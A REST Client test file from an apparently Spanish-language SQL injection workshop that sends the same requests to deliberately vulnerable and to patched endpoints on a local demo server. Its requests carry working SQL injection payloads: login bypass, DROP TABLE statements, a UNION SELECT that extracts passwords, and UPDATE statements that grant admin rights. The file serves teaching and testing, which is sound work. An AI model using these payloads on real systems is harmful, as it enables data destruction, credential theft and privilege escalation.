### SQL Injection Workshop - Pruebas HTTP
### Usar con Visual Studio Code y la extensi√≥n REST Client

### Variables de entorno
@baseUrl = https://localhost:5001
@vulnerableUrl = {{baseUrl}}/api/vulnerable
@secureUrl = {{baseUrl}}/api/secure

### ===========================================
### üö® ENDPOINTS VULNERABLES - PARA DEMOSTRACI√ìN
### ===========================================

### 1. Login Vulnerable - Ataque B√°sico
POST {{vulnerableUrl}}/login
Content-Type: application/json

{
  "username": "admin' OR '1'='1' --",
  "password": "cualquier_cosa"
}

### 2. Login Vulnerable - Ataque Avanzado
POST {{vulnerableUrl}}/login
Content-Type: application/json

{
  "username": "admin'; DROP TABLE Users; --",
  "password": "test"
}

### 3. B√∫squeda Vulnerable - Exposici√≥n de Datos
GET {{vulnerableUrl}}/search?searchTerm=%' UNION SELECT Username, Password, Email, IsAdmin FROM Users --

### 4. B√∫squeda Vulnerable - Ataque Simple
GET {{vulnerableUrl}}/search?searchTerm=' OR '1'='1' --

### 5. Comentario Vulnerable - Inserci√≥n Maliciosa
POST {{vulnerableUrl}}/comments
Content-Type: application/json

{
  "content": "'); DROP TABLE Comments; --",
  "author": "hacker"
}

### 6. Comentario Vulnerable - Ataque de Inserci√≥n
POST {{vulnerableUrl}}/comments
Content-Type: application/json

{
  "content": "Comentario normal",
  "author": "user'; UPDATE Users SET IsAdmin = 1 WHERE Username = 'user1'; --"
}

### 7. Admin Update Vulnerable - Escalaci√≥n de Privilegios
POST {{vulnerableUrl}}/admin/update
Content-Type: application/json

{
  "username": "admin'; UPDATE Users SET IsAdmin = 1 WHERE Username = 'user1'; --",
  "isAdmin": "true"
}

### ===========================================
### ‚úÖ ENDPOINTS SEGUROS - VERSIONES PARCHEADAS
### ===========================================

### 1. Login Seguro - Credenciales V√°lidas
POST {{secureUrl}}/login
Content-Type: application/json

{
  "username": "admin",
  "password": "admin123"
}

### 2. Login Seguro - Credenciales Inv√°lidas
POST {{secureUrl}}/login
Content-Type: application/json

{
  "username": "admin' OR '1'='1' --",
  "password": "cualquier_cosa"
}

### 3. B√∫squeda Segura - T√©rmino Normal
GET {{secureUrl}}/search?searchTerm=Laptop

### 4. B√∫squeda Segura - T√©rmino con Caracteres Especiales
GET {{secureUrl}}/search?searchTerm=' OR '1'='1' --

### 5. Comentario Seguro - Inserci√≥n Normal
POST {{secureUrl}}/comments
Content-Type: application/json

{
  "content": "Excelente producto, muy recomendado",
  "author": "usuario123"
}

### 6. Comentario Seguro - Intento de Ataque
POST {{secureUrl}}/comments
Content-Type: application/json

{
  "content": "'); DROP TABLE Comments; --",
  "author": "hacker"
}

### 7. Admin Update Seguro - Actualizaci√≥n Normal
POST {{secureUrl}}/admin/update
Content-Type: application/json

{
  "username": "user1",
  "isAdmin": "true"
}

### 8. Admin Update Seguro - Intento de Ataque
POST {{secureUrl}}/admin/update
Content-Type: application/json

{
  "username": "admin'; UPDATE Users SET IsAdmin = 1 WHERE Username = 'user1'; --",
  "isAdmin": "true"
}

### 9. Productos Caros - SQL Crudo Seguro
GET {{secureUrl}}/products/expensive?minPrice=50

### ===========================================
### üîç PRUEBAS DE COMPARACI√ìN
### ===========================================

### Comparar Login Vulnerable vs Seguro
### Ejecutar ambos endpoints con el mismo payload malicioso

### Payload Malicioso para Comparar:
### {
###   "username": "admin' OR '1'='1' --",
###   "password": "cualquier_cosa"
### }

### 1. Vulnerable (deber√≠a permitir el login)
POST {{vulnerableUrl}}/login
Content-Type: application/json

{
  "username": "admin' OR '1'='1' --",
  "password": "cualquier_cosa"
}

### 2. Seguro (deber√≠a rechazar el login)
POST {{secureUrl}}/login
Content-Type: application/json

{
  "username": "admin' OR '1'='1' --",
  "password": "cualquier_cosa"
}

### ===========================================
### üìä INFORMACI√ìN DEL SISTEMA
### ===========================================

### Obtener todos los usuarios (para verificar estado)
GET {{baseUrl}}/api/secure/search?searchTerm=

### Verificar comentarios
GET {{baseUrl}}/api/secure/search?searchTerm=comentario
